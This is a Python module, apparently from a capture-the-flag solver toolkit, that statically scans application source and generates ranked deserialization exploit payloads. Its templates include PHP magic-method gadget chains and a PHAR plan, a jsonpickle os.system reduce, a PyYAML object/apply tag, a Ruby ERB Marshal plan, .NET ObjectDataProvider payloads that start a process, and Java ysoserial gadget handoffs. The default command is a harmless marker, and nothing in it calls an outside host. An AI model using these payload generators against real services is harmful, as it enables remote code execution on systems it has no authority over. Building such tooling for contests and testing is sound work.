#!/usr/bin/env python3
"""Statically map deserialization surfaces to reviewable payload candidates.

This module only reads supplied source text and emits strings.  It never imports
challenge code, deserializes a value, invokes an interpreter, opens a socket, or
runs a generated command.  Candidates deliberately carry their prerequisites so
a player can select one for a sacrificial, scope-locked test.

The Java entries are hand-off metadata for :mod:`solvers.toolkits.java_deser`;
this lightweight analyzer does not invoke ysoserial or a JVM.
"""

from __future__ import annotations

import argparse
import itertools
import json
import re
import sys
from pathlib import Path
from typing import Any, Sequence
from xml.sax.saxutils import escape as xml_escape


MAX_SOURCE = 2 * 1024 * 1024
MAX_COMMAND = 4096
MAX_CANDIDATES = 96


class DeserInputError(ValueError):
    """A malformed or over-limit analyzer input."""


class _Parser(argparse.ArgumentParser):
    def error(self, message: str) -> None:  # pragma: no cover - via main
        raise DeserInputError(message)


def _bounded_text(value: Any, name: str, maximum: int) -> str:
    if not isinstance(value, str):
        raise DeserInputError(f"{name} must be text")
    try:
        encoded = value.encode("utf-8")
    except UnicodeEncodeError as exc:
        raise DeserInputError(f"{name} is not valid Unicode text") from exc
    if len(encoded) > maximum:
        raise DeserInputError(f"{name} exceeds {maximum} bytes")
    if "\x00" in value:
        raise DeserInputError(f"{name} contains NUL")
    return value


def _row(rank: int, language: str, name: str, value: str, requirement: str,
         *, evidence: Sequence[str] = (), format_: str = "text") -> dict[str, Any]:
    return {
        "rank": rank,
        "language": language,
        "name": name,
        "format": format_,
        "value": value,
        "requirement": requirement,
        "evidence": list(itertools.islice(evidence, 16)),
        "candidate_only": True,
        "offline": True,
        "executed": False,
        "network_requests": 0,
    }


LANGUAGE_MARKERS = {
    "php": (r"<\?php", r"\b(?:unserialize|__destruct|__wakeup|__toString)\b", r"Phar::"),
    "python": (r"\b(?:jsonpickle|yaml\.(?:load|unsafe_load)|FullLoader|UnsafeLoader)\b", r"__reduce__"),
    "ruby": (r"\b(?:Marshal\.load|ERB\.new|YAML\.load)\b", r"def\s+(?:marshal_load|_load)\b"),
    "dotnet": (r"\b(?:JsonConvert|TypeNameHandling|ObjectDataProvider|BinaryFormatter)\b",),
    "java": (r"\b(?:ObjectInputStream|readObject|XMLDecoder|XStream)\b", r"commons-collections", r"jackson-databind"),
}


def detect_languages(source: str) -> dict[str, list[str]]:
    """Return languages/formats with bounded matching evidence."""

    source = _bounded_text(source, "source", MAX_SOURCE)
    found: dict[str, list[str]] = {}
    for language, patterns in LANGUAGE_MARKERS.items():
        evidence: list[str] = []
        for pattern in patterns:
            match = re.search(pattern, source, re.IGNORECASE)
            if match:
                evidence.append(match.group(0)[:120])
        if evidence:
            found[language] = evidence
    return found


def php_serialize_object(class_name: str, properties: dict[str, str]) -> str:
    """Build a simple PHP serialized object with byte-correct string lengths."""

    class_name = _bounded_text(class_name, "class name", 256)
    if not re.fullmatch(r"[A-Za-z_\\][A-Za-z0-9_\\]*", class_name):
        raise DeserInputError("invalid PHP class name")
    if not isinstance(properties, dict) or len(properties) > 32:
        raise DeserInputError("PHP properties must be an object with at most 32 entries")
    pieces: list[str] = []
    for key, value in properties.items():
        key = _bounded_text(key, "property name", 512)
        value = _bounded_text(value, "property value", MAX_COMMAND)
        pieces.append(f's:{len(key.encode("utf-8"))}:"{key}";s:{len(value.encode("utf-8"))}:"{value}";')
    return f'O:{len(class_name.encode("utf-8"))}:"{class_name}":{len(pieces)}:{{{"".join(pieces)}}}'


def _php_object(class_name: str, properties: Sequence[tuple[str, str, bool]]) -> str:
    """Serialize prevalidated ``(name, value, value_is_serialized)`` fields."""

    fields: list[str] = []
    for name, value, serialized in properties[:32]:
        name = _bounded_text(name, "property name", 512)
        if serialized:
            encoded_value = value
        else:
            value = _bounded_text(value, "property value", MAX_COMMAND)
            encoded_value = f's:{len(value.encode("utf-8"))}:"{value}";'
        fields.append(f's:{len(name.encode("utf-8"))}:"{name}";{encoded_value}')
    return f'O:{len(class_name.encode("utf-8"))}:"{class_name}":{len(fields)}:{{{"".join(fields)}}}'


def _php_class_blocks(source: str) -> list[tuple[str, str]]:
    """Extract at most 64 balanced class blocks without parsing/executing PHP."""

    blocks: list[tuple[str, str]] = []
    for match in itertools.islice(re.finditer(r"\bclass\s+([A-Za-z_][A-Za-z0-9_]*)[^\{]{0,1024}\{",
                                               source, re.IGNORECASE), 64):
        depth = 1
        cursor = match.end()
        # A lexical approximation is sufficient for candidate generation.  The
        # work is strictly linear and bounded by the supplied 2 MiB source.
        while cursor < len(source) and depth:
            if source[cursor] == "{":
                depth += 1
            elif source[cursor] == "}":
                depth -= 1
            cursor += 1
        blocks.append((match.group(1), source[match.end():cursor - 1 if depth == 0 else cursor]))
    return blocks


def php_magic_chains(source: str, command: str = "printf CSCTF_DESER_MARKER") -> list[dict[str, Any]]:
    """Infer direct and one-hop PHP magic-method object graphs.

    A one-hop graph is emitted when a magic method calls
    ``$this->property->method()`` and another supplied class defines ``method``
    around a command sink.  This deliberately avoids inventing long chains that
    are not supported by the source.
    """

    source = _bounded_text(source, "source", MAX_SOURCE)
    command = _bounded_text(command, "command", MAX_COMMAND)
    blocks = _php_class_blocks(source)
    rows: list[dict[str, Any]] = []
    sinks = r"(?:system|exec|passthru|shell_exec|popen|proc_open)\s*\("
    targets: dict[str, list[tuple[str, re.Match[str]]]] = {}
    function_pattern = re.compile(
        r"function\s+([A-Za-z_][A-Za-z0-9_]*)\s*\([^)]*\)\s*\{([\s\S]{0,65536}?)\}",
        re.IGNORECASE)
    for inner_name, inner_body in blocks:
        for method_match in itertools.islice(function_pattern.finditer(inner_body), 32):
            if re.search(sinks, method_match.group(2), re.IGNORECASE):
                targets.setdefault(method_match.group(1).lower(), []).append((inner_name, method_match))
    magic_pattern = re.compile(
        r"function\s+(__destruct|__wakeup|__toString|__invoke)\s*\([^)]*\)\s*\{([\s\S]{0,65536}?)\}",
        re.IGNORECASE)
    for outer_name, outer_body in blocks:
        if len(rows) >= 24:
            break
        for magic in itertools.islice(magic_pattern.finditer(outer_body), 8):
            magic_name, magic_body = magic.group(1), magic.group(2)
            display_magic = magic_name.lower().lstrip("_")
            if re.search(sinks, magic_body, re.IGNORECASE):
                prop_match = re.search(
                    r"(?:system|exec|passthru|shell_exec|popen|proc_open)\s*\(\s*\$this->([A-Za-z_][A-Za-z0-9_]*)",
                    magic_body, re.IGNORECASE)
                prop = prop_match.group(1) if prop_match else "command"
                payload = _php_object(outer_name, [(prop, command, False)])
                rows.append(_row(0, "php", f"direct_{display_magic}_{outer_name}", payload,
                                 f"{magic_name} must pass ${prop} to the observed command sink",
                                 evidence=[f"{outer_name}::{magic_name}", magic.group(0)[:240]],
                                 format_="php-serialize"))
            for edge in itertools.islice(re.finditer(
                    r"\$this->([A-Za-z_][A-Za-z0-9_]*)->([A-Za-z_][A-Za-z0-9_]*)\s*\(", magic_body), 16):
                prop, method = edge.groups()
                for inner_name, method_match in targets.get(method.lower(), [])[:8]:
                    method_body = method_match.group(2)
                    command_prop_match = re.search(
                        r"(?:system|exec|passthru|shell_exec|popen|proc_open)\s*\(\s*\$this->([A-Za-z_][A-Za-z0-9_]*)",
                        method_body, re.IGNORECASE)
                    command_prop = command_prop_match.group(1) if command_prop_match else "command"
                    inner = _php_object(inner_name, [(command_prop, command, False)])
                    payload = _php_object(outer_name, [(prop, inner, True)])
                    rows.append(_row(0, "php", f"nested_{display_magic}_{outer_name}_{inner_name}", payload,
                                     f"{outer_name}::{magic_name} must call {inner_name}::{method}, whose observed sink uses ${command_prop}",
                                     evidence=[f"$this->{prop}->{method}()", method_match.group(0)[:240]],
                                     format_="php-serialize"))
                    if len(rows) >= 24:
                        break
                if len(rows) >= 24:
                    break
            if len(rows) >= 24:
                break
    for rank, row in enumerate(rows, 1):
        row["rank"] = rank
    return rows


def _php_candidates(source: str, command: str, start: int) -> list[dict[str, Any]]:
    evidence = [m.group(0)[:120] for m in itertools.islice(re.finditer(
        r"(?:class\s+\w+|function\s+__(?:destruct|wakeup|toString|invoke)|(?:system|exec|passthru|shell_exec)\s*\()",
        source, re.IGNORECASE), 16)]
    classes = [m.group(1) for m in itertools.islice(
        re.finditer(r"\bclass\s+([A-Za-z_][A-Za-z0-9_]*)", source), 16)]
    class_name = classes[0] if classes else "CandidateGadget"
    inferred = php_magic_chains(source, command)
    serialized = inferred[0]["value"] if inferred else php_serialize_object(class_name, {"command": command})
    rows = [
        _row(start, "php", "magic_method_object", serialized,
             "a reachable magic method must use the supplied property in a dangerous sink", evidence=evidence,
             format_="php-serialize"),
        _row(start + 1, "php", "phar_metadata_plan",
             json.dumps({"carrier": "phar", "metadata": serialized, "stub": "<?php __HALT_COMPILER(); ?>"},
                        sort_keys=True),
             "the application must perform a PHAR-aware filesystem operation and accept a player-built PHAR",
             evidence=evidence, format_="build-plan-json"),
    ]
    # Preserve detailed inferred paths after the two stable generic entries.
    for inferred_row in inferred[:12]:
        inferred_row["rank"] = start + len(rows)
        rows.append(inferred_row)
    return rows


def _python_candidates(command: str, start: int, evidence: Sequence[str]) -> list[dict[str, Any]]:
    jsonpickle = json.dumps({"py/reduce": [{"py/function": "os.system"}, {"py/tuple": [command]}]},
                            separators=(",", ":"))
    yaml_value = "!!python/object/apply:os.system [" + json.dumps(command) + "]\n"
    return [
        _row(start, "python", "jsonpickle_reduce", jsonpickle,
             "the target must call jsonpickle.decode with unsafe class construction enabled", evidence=evidence,
             format_="json"),
        _row(start + 1, "python", "pyyaml_object_apply", yaml_value,
             "the target must use an unsafe PyYAML Loader; SafeLoader rejects this tag", evidence=evidence,
             format_="yaml"),
    ]


def _ruby_candidates(command: str, start: int, evidence: Sequence[str]) -> list[dict[str, Any]]:
    # Ruby Marshal is version-sensitive.  Emit a deterministic graph plan rather
    # than pretending a hand-authored byte stream is portable.
    plan = {
        "builder": "Ruby sacrificial interpreter",
        "root": "ERB",
        "ivars": {"@src": "<%= system(ARGV.fetch(0)) %>"},
        "argument": command,
        "encode": "Marshal.dump then Base64.strict_encode64",
    }
    return [_row(start, "ruby", "marshal_erb_build_plan", json.dumps(plan, sort_keys=True),
                 "a compatible Ruby/ERB gadget path and Marshal.load must be reachable", evidence=evidence,
                 format_="build-plan-json")]


def _dotnet_candidates(command: str, start: int, evidence: Sequence[str]) -> list[dict[str, Any]]:
    parts = command.split(maxsplit=1)
    program, arguments = parts[0], parts[1] if len(parts) == 2 else ""
    jsonnet = {
        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
        "MethodName": "Start",
        "MethodParameters": {"$type": "System.Collections.ArrayList, mscorlib", "$values": [program, arguments]},
        "ObjectInstance": {"$type": "System.Diagnostics.Process, System"},
    }
    xaml = (
        '<ObjectDataProvider xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" '
        'MethodName="Start"><ObjectDataProvider.ObjectInstance><Process xmlns="clr-namespace:System.Diagnostics;assembly=System"/>'
        '</ObjectDataProvider.ObjectInstance><ObjectDataProvider.MethodParameters>'
        f'<s:String xmlns:s="clr-namespace:System;assembly=mscorlib">{xml_escape(program)}</s:String>'
        f'<s:String xmlns:s="clr-namespace:System;assembly=mscorlib">{xml_escape(arguments)}</s:String>'
        '</ObjectDataProvider.MethodParameters></ObjectDataProvider>'
    )
    return [
        _row(start, "dotnet", "jsonnet_object_data_provider", json.dumps(jsonnet, separators=(",", ":")),
             "Json.NET TypeNameHandling must accept attacker-controlled $type and PresentationFramework must be available",
             evidence=evidence, format_="json"),
        _row(start + 1, "dotnet", "xaml_object_data_provider", xaml,
             "an unsafe XAML reader must instantiate ObjectDataProvider", evidence=evidence, format_="xaml"),
    ]


JAVA_LIBRARY_GADGETS = (
    ("commons-collections", "CommonsCollections6"),
    ("commons-beanutils", "CommonsBeanutils1"),
    ("spring", "Spring1"),
    ("groovy", "Groovy1"),
    ("rome", "ROME"),
)


def _java_candidates(source: str, command: str, start: int, evidence: Sequence[str]) -> list[dict[str, Any]]:
    chosen = [(marker, gadget) for marker, gadget in JAVA_LIBRARY_GADGETS if marker in source.lower()]
    if not chosen:
        chosen = [("JDK-only detection", "URLDNS")]
    rows = []
    for offset, (marker, gadget) in enumerate(chosen[:8]):
        handoff = {"module": "solvers/toolkits/java_deser.py", "gadget": gadget,
                   "argument": command, "detonate": False}
        rows.append(_row(start + offset, "java", f"java_handoff_{gadget.lower()}",
                         json.dumps(handoff, sort_keys=True),
                         f"confirm {marker} and compatible versions on the supplied classpath before building",
                         evidence=evidence, format_="handoff-json"))
    return rows


def synthesize(source: str, command: str = "printf CSCTF_DESER_MARKER",
               languages: Sequence[str] | None = None) -> dict[str, Any]:
    """Analyze source and return ranked, non-executed candidate strings."""

    source = _bounded_text(source, "source", MAX_SOURCE)
    command = _bounded_text(command, "command", MAX_COMMAND)
    if not command:
        raise DeserInputError("command must not be empty")
    detected = detect_languages(source)
    allowed = set(LANGUAGE_MARKERS)
    if languages is not None:
        try:
            selected = list(itertools.islice(languages, len(allowed) + 1))
        except TypeError as exc:
            raise DeserInputError("languages must be an iterable of language names") from exc
    else:
        selected = list(detected)
    if len(selected) > len(allowed) or any(item not in allowed for item in selected):
        raise DeserInputError("languages must be chosen from php,python,ruby,dotnet,java")
    selected = list(dict.fromkeys(selected))
    rows: list[dict[str, Any]] = []
    for language in selected:
        start = len(rows) + 1
        evidence = detected.get(language, [])
        if language == "php":
            rows.extend(_php_candidates(source, command, start))
        elif language == "python":
            rows.extend(_python_candidates(command, start, evidence))
        elif language == "ruby":
            rows.extend(_ruby_candidates(command, start, evidence))
        elif language == "dotnet":
            rows.extend(_dotnet_candidates(command, start, evidence))
        elif language == "java":
            rows.extend(_java_candidates(source, command, start, evidence))
        if len(rows) > MAX_CANDIDATES:
            raise DeserInputError("candidate cap exceeded")
    for index, row in enumerate(rows, 1):
        row["rank"] = index
    return {"detected": detected, "candidates": rows, "offline": True,
            "deserialized": False, "executed": False, "network_requests": 0}


analyze_source = synthesize
synthesize_gadgets = synthesize


def _read_source(path: str) -> str:
    try:
        with Path(path).open("rb") as handle:
            raw = handle.read(MAX_SOURCE + 1)
    except OSError as exc:
        raise DeserInputError(f"cannot read source: {exc}") from exc
    if len(raw) > MAX_SOURCE:
        raise DeserInputError(f"source exceeds {MAX_SOURCE} bytes")
    try:
        return raw.decode("utf-8")
    except UnicodeDecodeError as exc:
        raise DeserInputError("source is not UTF-8") from exc


def build_parser() -> argparse.ArgumentParser:
    parser = _Parser(description=__doc__)
    parser.add_argument("source", help="supplied application source (UTF-8)")
    parser.add_argument("--command", default="printf CSCTF_DESER_MARKER")
    parser.add_argument("--language", action="append", choices=sorted(LANGUAGE_MARKERS))
    parser.add_argument("--json", action="store_true", help="emit machine-readable JSON")
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    try:
        args = build_parser().parse_args(argv)
        result = synthesize(_read_source(args.source), args.command, args.language)
        if args.json:
            print(json.dumps(result, indent=2, sort_keys=True))
        else:
            for row in result["candidates"]:
                print(f'{row["rank"]}. [{row["language"]}] {row["name"]}: {row["value"]}')
                print(f'   requires: {row["requirement"]}')
        return 0
    except (DeserInputError, OSError, UnicodeError, ValueError, TypeError,
            RecursionError, OverflowError, MemoryError) as exc:
        print(f"deser_gadgets: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
